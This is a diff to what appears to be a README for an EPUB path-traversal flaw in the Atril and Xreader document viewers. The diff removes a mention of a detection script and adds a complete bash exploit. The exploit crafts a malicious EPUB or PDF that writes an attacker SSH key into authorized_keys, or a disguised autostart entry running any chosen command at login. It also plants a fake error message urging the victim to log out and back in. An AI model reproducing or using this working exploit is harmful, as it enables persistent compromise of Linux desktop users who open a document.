@@ -116,7 +116,204 @@ Upon further analysis, I found out that we can use the /proc/self/cwd to access 
 
 I have created a fully working exploit for this vulnerability (exploit_rce.sh) and a script to write and include custom files for path traversal (exploit_file_write.sh).
 
-NOTE: In MATE's Atril the vulnerability is not fixed, the devs are patching the vulnerability. So I added a detection script (detect.sh) to detect malicious EPUB documents and sanitize them before opening.
+##
+##
 
-Demo: (Linux Mint)
-Using the exploit, Create a Malicious Document that Executes the Calculator app
+
+```
+#!/bin/bash
+
+####################################################################################
+#                                                                                                                                                      #
+#  This Exploit is still in development stage, it can be modified and tweaked to work more efficient   #
+#  and more accurate.                                                                                                                       #
+#                                                                                                                                                      #
+####################################################################################
+printf "
+╔═╗┬  ┬┌─┐┌─┐┬ ┬   ╔╗ ┌─┐┌─┐┬┌─
+╚═╗│  │├─┘├─┘└┬┘───╠╩╗│ ││ │├┴┐
+╚═╝┴─┘┴┴  ┴   ┴    ╚═╝└─┘└─┘┴ ┴
+ 0-day RCE Exploit for Linux desktop environments (MATE, Cinnamon, UKUI)
+                  -by Febin (@febin_nj)
+
+[+] Affected Software components: Atril (default document viewer of MATE DE), Xreader (Default Doc Viewer of Cinnamon DE, Mint OS)
+
+[+] Affected OS: Linux Mint, Kali Linux, Parrot Security OS, Ubuntu-mate, Xubuntu, Ubuntu Kylin(Official chinese variant of Ubuntu ), KylinOS V10 (Chinese OS) and other OS with MATE, Cinnamon DE, Kylin DE or Atril/Xreader as default doc reader.
+
+
+"
+rm -rf ./XXYXXYXXYXXYXXY*
+
+write_ssh(){
+
+
+ssh-keygen -t rsa -P '' -f ./slippy_rsa
+
+
+cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdY.sshYauthorized_keys
+cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdY.ssh2Yauthorized_keys
+cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXY.sshYauthorized_keys
+cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXY.ssh2Yauthorized_keys
+
+cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.sshYauthorized_keys
+cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.ssh2Yauthorized_keys
+
+cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.sshYauthorized_keys
+cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.ssh2Yauthorized_keys
+
+cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXYXXY.sshYauthorized_keys
+cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXYXXY.ssh2Yauthorized_keys
+
+
+zip -u "$tmpfile" XXYXXYXXYXXYXXYprocYselfYcwdY.sshYauthorized_keys XXYXXYXXYXXYXXYprocYselfYcwdY.ssh2Yauthorized_keys XXYXXYXXYXXYXXYprocYselfYcwdYXXY.sshYauthorized_keys XXYXXYXXYXXYXXYprocYselfYcwdYXXY.ssh2Yauthorized_keys  XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.sshYauthorized_keys  XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.ssh2Yauthorized_keys  XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.sshYauthorized_keys  XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.ssh2Yauthorized_keys  XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXYXXY.sshYauthorized_keys  >/dev/null
+
+sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdY.sshYauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/.ssh\/authorized_keys"/g "$tmpfile"
+sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXY.sshYauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/.ssh\/authorized_keys"/g "$tmpfile"
+
+sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.sshYauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/.ssh\/authorized_keys"/g "$tmpfile"
+sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.sshYauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/..\/.ssh\/authorized_keys"/g "$tmpfile"
+sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXYXXY.sshYauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/..\/..\/.ssh\/authorized_keys"/g "$tmpfile"
+
+sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdY.ssh2Yauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/.ssh2\/authorized_keys"/g "$tmpfile"
+sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXY.ssh2Yauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/.ssh2\/authorized_keys"/g "$tmpfile"
+
+sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.ssh2Yauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/.ssh2\/authorized_keys"/g "$tmpfile"
+sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.ssh2Yauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/..\/.ssh2\/authorized_keys"/g "$tmpfile"
+sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXYXXY.ssh2Yauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/..\/..\/.ssh2\/authorized_keys"/g "$tmpfile"
+
+epub="${epub%.*}.epub"
+mkdir output 2> /dev/null
+cp "$tmpfile" output/"$epub"
+cp "$tmpfile" output/"${epub%.*}.pdf"
+rm -rf "$tmpfile"
+echo "
+
+[+] Files $epub and ${epub%.*}.pdf written to output/ directory!
+"
+}
+
+write_autostart(){
+
+printf "[>] Enter the Payload/Command to execute on the target: "
+read CMD
+autostart_app="desktop-login${RANDOM}.desktop"
+tmp_autostart="XXYXXYXXYXXYXXYprocYselfYcwdY.configYautostartY${autostart_app}"
+tmp_autostart2="XXYXXYXXYXXYXXYprocYselfYcwdYXXY.configYautostartY${autostart_app}"
+tmp_autostart3="XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.configYautostartY${autostart_app}"
+tmp_autostart4="XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.configYautostartY${autostart_app}"
+
+echo "[Desktop Entry]
+Encoding=UTF-8
+Version=1.0
+Type=Application
+Terminal=false
+Exec=bash -c \"$CMD\"
+Name=Desktop Service
+" > "$tmp_autostart"
+
+echo "[Desktop Entry]
+Encoding=UTF-8
+Version=1.0
+Type=Application
+Terminal=false
+Exec=bash -c \"$CMD\"
+Name=Desktop Service
+" > "$tmp_autostart2"
+
+echo "[Desktop Entry]
+Encoding=UTF-8
+Version=1.0
+Type=Application
+Terminal=false
+Exec=bash -c \"$CMD\"
+Name=Desktop Service
+" > "$tmp_autostart3"
+
+echo "[Desktop Entry]
+Encoding=UTF-8
+Version=1.0
+Type=Application
+Terminal=false
+Exec=bash -c \"$CMD\"
+Name=Desktop Service
+" > "$tmp_autostart4"
+
+
+
+chmod 777 $tmp_autostart
+
+zip -u "$tmpfile" $tmp_autostart $tmp_autostart2 $tmp_autostart3 $tmp_autostart4 >/dev/null
+
+sed -i s/"$tmp_autostart"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/.config\/autostart\/$autostart_app"/g "$tmpfile"
+sed -i s/"$tmp_autostart2"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/.config\/autostart\/$autostart_app"/g "$tmpfile"
+sed -i s/"$tmp_autostart3"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/.config\/autostart\/$autostart_app"/g "$tmpfile"
+sed -i s/"$tmp_autostart4"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/..\/.config\/autostart\/$autostart_app"/g "$tmpfile"
+
+epub="${epub%.*}.epub"
+mkdir output 2>/dev/null
+cp "$tmpfile" output/"$epub"
+cp "$tmpfile" output/"${epub%.*}.pdf"
+rm -rf "$tmpfile"
+echo "
+
+[+] Files $epub and ${epub%.*}.pdf written to output/ directory!
+"
+}
+
+mainprogram(){
+file $epub_path | grep "EPUB document" >/dev/null
+  
+if [ "$?" -eq "0" ]
+then
+     epub=$(basename $epub_path)
+     rand=$RANDOM
+     tmpfile="$rand"_"$epub"
+     cp "$epub_path" ./"$tmpfile"
+     
+     fake_error="XXYXXYXXYXXYXXYtmpYerror-${RANDOM}.log"
+     
+     echo "Error opening the document! 
+Logging off and logging back in might fix the issue" > $fake_error
+     zip -u "$tmpfile" "$fake_error" >/dev/null
+     sed -i s/"XXYXXYXXYXXYXXYtmpY"/"..\/..\/..\/..\/..\/tmp\/"/g "$tmpfile"
+     rm -f "$fake_error"
+     
+     echo " [1] Write an autostart app in the victim machine(Efficient, Payload will be triggered when user logs out and logs back in) [Default]"
+     echo " [2] Write authorized_keys file on the target machine. (Needs SSH enabled on the target)"
+     printf "\n    [>] Enter your choice [Default: 1]: "
+     
+     read choice
+     if [ "$choice" == "1" ]
+     then
+     write_autostart
+     elif [ "$choice" == "2" ]
+     then
+     write_ssh
+     else
+     echo "[-] Inavlid Choice! Going with the default option [1] "
+     write_autostart
+     fi
+
+else
+     echo "[-] Error: Specified File is not an EPUB document."
+     exit
+fi
+
+rm -rf $tmpfile 
+}
+
+printf "[>] Epub document location [Default: sample1.epub]: "
+read epub_path
+epub_path=${epub_path:-./sample1.epub}
+if [ -e $epub_path ]
+then
+  mainprogram
+  rm -rf ./XXYXXYXXYXXYXXY*
+else
+ echo "[-] Error: Specified File does not exists."
+ exit
+fi
+rm -rf ./XXYXXYXXYXXYXXY*
+```
+
+
